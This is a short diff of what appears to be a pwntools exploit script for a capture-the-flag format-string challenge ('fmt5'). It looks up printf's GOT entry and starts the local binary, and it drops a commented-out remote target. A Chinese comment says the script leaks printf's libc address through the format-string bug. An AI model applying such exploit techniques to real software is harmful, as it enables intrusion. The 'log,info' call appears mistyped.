@@ -11,7 +11,7 @@ printf_got=elf.got['printf']
 log,info("printf_got: {0}".format(hex(printf_got)))
 
 r=process("./pwn/string/fmt-5/fmt5")
-# r=remote("train2024.hitctf.cn",26356)
+
 print(r.recvline())
 
 #利用格式化漏洞，泄漏出printf在libc中的真实地址
